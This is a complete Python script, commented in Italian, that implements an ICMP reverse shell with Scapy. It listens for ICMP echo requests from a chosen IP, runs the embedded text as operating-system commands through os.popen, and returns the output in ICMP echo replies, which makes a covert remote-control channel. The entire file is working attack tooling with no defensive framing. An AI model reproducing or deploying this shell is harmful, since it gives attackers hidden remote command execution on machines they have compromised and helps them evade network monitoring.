#!/usr/bin/env python3

import argparse
import os
from scapy.all import sr, IP, ICMP, Raw, sniff

# Variabili predefinite
ICMP_ID = 1234  # ID predefinito per i pacchetti ICMP
TTL = 64  # Time to Live predefinito per i pacchetti ICMP

def check_scapy():
    """
    Verifica se Scapy è installato nel sistema.
    """
    try:
        from scapy.all import sr, IP, ICMP, Raw
        print("Scapy è installato correttamente.")
    except ImportError:
        print("Scapy non è installato. Installalo eseguendo 'pip install scapy'.")

# Configurazione del parser per gli argomenti da riga di comando
parser = argparse.ArgumentParser(description='Shell Reversa ICMP')
parser.add_argument('-d', '--destination_ip', type=str, help='Indirizzo IP di destinazione', required=True)
parser.add_argument('-i', '--interface', type=str, help='Interfaccia di rete da utilizzare', required=True)
args = parser.parse_args()

def icmpshell(pkt):
    """
    Funzione principale che elabora i pacchetti ICMP.
    """
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID:
        icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
        print(f"Comando ricevuto: {icmppaket}")
        payload = os.popen(icmppaket).readlines()
        payload = ''.join(payload)
        icmppacket = IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload)
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass

if __name__ == '__main__':
    check_scapy()
    print("[+] ICMP listener avviato!")
    sniff(iface=args.interface, prn=icmpshell, filter="icmp", store=0)
